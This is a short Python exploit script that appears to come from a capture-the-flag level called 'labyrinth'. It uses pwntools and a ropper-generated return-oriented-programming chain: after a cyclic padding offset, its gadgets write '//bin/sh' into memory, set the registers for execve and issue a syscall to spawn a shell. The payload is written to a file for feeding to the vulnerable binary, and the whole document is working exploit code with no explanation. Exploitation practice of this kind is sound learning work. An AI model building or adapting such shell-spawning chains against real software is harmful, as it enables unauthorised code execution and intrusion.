#!/usr/bin/env python3
# Generated by ropper ropchain generator #
import struct
from pwn import *

p = lambda x : struct.pack('Q', x)

IMAGE_BASE_0 = 0x0000000000400000 # 462c6d7675a2255f597a0010045981bad855451ed81126ec1c832a2b5efa5edb
rebase_0 = lambda x : p(x + IMAGE_BASE_0)

rop = cyclic(cyclic_find(b'vaaf'))

rop += rebase_0(0x000000000002a9dc) # 0x000000000042a9dc: pop rdx; adc eax, 0xc9900000; ret; 
rop += b'//bin/sh'
rop += rebase_0(0x000000000000d974) # 0x000000000040d974: pop rax; ret; 
rop += rebase_0(0x0000000000250510)
rop += rebase_0(0x0000000000006ed3) # 0x0000000000406ed3: mov qword ptr [rax], rdx; nop; pop rbp; ret; 
rop += p(0xdeadbeefdeadbeef)
rop += rebase_0(0x000000000002a9dc) # 0x000000000042a9dc: pop rdx; adc eax, 0xc9900000; ret; 
rop += p(0x0000000000000000)
rop += rebase_0(0x000000000000d974) # 0x000000000040d974: pop rax; ret; 
rop += rebase_0(0x0000000000250518)
rop += rebase_0(0x0000000000006ed3) # 0x0000000000406ed3: mov qword ptr [rax], rdx; nop; pop rbp; ret; 
rop += p(0xdeadbeefdeadbeef)
rop += rebase_0(0x0000000000036be3) # 0x0000000000436be3: pop rdi; ret; 
rop += rebase_0(0x0000000000250510)
rop += rebase_0(0x000000000001ba7e) # 0x000000000041ba7e: pop rsi; ret; 
rop += rebase_0(0x0000000000250518)
rop += rebase_0(0x000000000002a9dc) # 0x000000000042a9dc: pop rdx; adc eax, 0xc9900000; ret; 
rop += rebase_0(0x0000000000250518)
rop += rebase_0(0x000000000000d974) # 0x000000000040d974: pop rax; ret; 
rop += p(0x000000000000003b)
rop += rebase_0(0x00000000000053ac) # 0x00000000004053ac: syscall; ret;

with open("level5/labyrinth", "wb") as fl:
    fl.write(rop)